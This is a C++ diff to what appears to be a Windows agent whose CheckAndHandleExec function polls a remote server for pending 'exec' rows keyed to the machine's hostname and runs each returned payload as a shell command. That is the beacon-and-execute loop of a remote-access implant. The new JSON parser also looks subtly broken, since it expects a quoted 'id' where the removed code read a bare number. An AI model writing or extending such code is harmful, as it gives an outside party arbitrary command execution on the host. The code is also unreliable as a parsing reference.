@@ -102,6 +102,33 @@ static std::string EscapeJSON(const std::string& s) {
     return out;
 }
 
+static std::string ExtractJSONString(const std::string& json, const std::string& key) {
+    std::string search = "\"" + key + "\":\"";
+    size_t pos = json.find(search);
+    if (pos == std::string::npos) return "";
+    pos += search.size();
+    std::string result;
+    while (pos < json.size()) {
+        char c = json[pos];
+        if (c == '\\') {
+            pos++;
+            if (pos >= json.size()) break;
+            if (json[pos] == '"') result += '"';
+            else if (json[pos] == '\\') result += '\\';
+            else if (json[pos] == 'n') result += '\n';
+            else if (json[pos] == 'r') result += '\r';
+            else if (json[pos] == 't') result += '\t';
+            else { result += '\\'; result += json[pos]; }
+        } else if (c == '"') {
+            break;
+        } else {
+            result += c;
+        }
+        pos++;
+    }
+    return result;
+}
+
 static std::string GetTimestamp() {
     time_t now = time(NULL);
     struct tm* tm = gmtime(&now);
@@ -814,19 +841,10 @@ static void CheckAndHandleExec() {
     q += L"?command=eq.exec&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
     std::string resp;
     if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
-    if (resp.size() < 10 || resp.find("\"payload\":\"") == std::string::npos) return;
-    size_t idPos = resp.find("\"id\":");
-    if (idPos == std::string::npos) return;
-    idPos += 5;
-    size_t idEnd = resp.find_first_of("},]", idPos);
-    if (idEnd == std::string::npos) return;
-    std::string rowId = resp.substr(idPos, idEnd - idPos);
-    size_t payPos = resp.find("\"payload\":\"", idEnd);
-    if (payPos == std::string::npos) return;
-    payPos += 11;
-    size_t payEnd = resp.find("\"", payPos);
-    if (payEnd == std::string::npos) return;
-    std::string payload = resp.substr(payPos, payEnd - payPos);
+    if (resp.size() < 10) return;
+    std::string rowId = ExtractJSONString(resp, "id");
+    std::string payload = ExtractJSONString(resp, "payload");
+    if (rowId.empty() || payload.empty()) return;
     DWORD exitCode = 0;
     std::string output = ExecuteCommand(payload, &exitCode);
     if (output.empty()) output = "(no output)";
